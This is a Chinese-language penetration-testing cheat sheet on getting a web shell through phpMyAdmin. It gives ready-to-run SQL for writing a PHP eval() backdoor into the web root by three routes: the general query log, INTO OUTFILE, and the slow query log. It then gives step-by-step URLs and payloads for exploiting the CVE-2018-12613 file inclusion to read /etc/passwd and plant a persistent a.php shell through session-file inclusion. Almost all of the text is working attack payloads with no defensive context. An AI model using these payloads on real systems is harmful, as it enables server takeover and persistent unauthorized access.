[phpmyadmin写shell](https://mp.weixin.qq.com/s/GG_W7LBbfBrCX33ewcEwAg) [2](https://blog.csdn.net/qq_40638006/article/details/122033546) [3](https://mp.weixin.qq.com/s/Y1yP5JmAZWwxYoSZSuaEIg)

### phpMyadmin 后台日志写shell
方式1.登录到后台日志写shell
```shell
show global variables like "%genera%";    #查询general_log全局变量配置
set global general_log='on';             #开启生成日志
SET global general_log_file='C:/phpStudy/www/shell.php'; #设置日志存储路径
select "<?php eval($_POST['cmd']);?>";   #写入一句话
set global general_log='off';             #关闭general_log模式
```

方式2. outfile

```bash
select "<?php @eval($_POST['cmd']);?>" into outfile "C://phpstudy/www/info.php"
select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/shell.php'
```
需要配置文件中 secure_file_priv 值为NULL, 且更改后需重启服务才生效且更改后需重启服务才生效

方式3. 慢日志
```bash
--show variables like '%slow_query_log%';      查看慢查询日志开启情况
--set global slow_query_log=on;         开启慢查询日志
--set global slow_query_log_file='绝对路径/shell03.php';   修改日志文件存储的绝对路径
--select "<?php @eval($_POST['123']);?>" or sleep(10);      向日志文件中写入shell
#使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：
--show global variables like '%long_query_time%';
```

### CVE-2018-12613 文件包含
[phpMyAdmin 4.8.0和4.8.1](https://blog.csdn.net/qq_38626043/article/details/119620612)

http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
可见/etc/passwd被读取, 后面进行 session 包含读马

在同一窗口执行，防止 session改变
test库执行sql `select '<?php phpinfo(); ?>'`

F12 - Application - Cookies 看到 session: `b38ba3b7116d19bb294a73c12229db12` 访问成功显示 phpinfo();

http://192.168.50.8:2003/index.php?target=db_datadict.php%253f../../../../../../../../../tmp/sess_0b71943960b781880a45a642c4179c4d

再执行sql。不要管错误
```sql
select `<?php fputs(fopen("a.php","w"),'<?php eval($_POST[a]);?>');?>`
```

访问 http://192.168.50.8:2003/index.php?target=db_datadict.php%253f../../../../../../../../../tmp/sess_0b71943960b781880a45a642c4179c4d

完成a.php的添加:   http://192.168.50.8:2003/a.php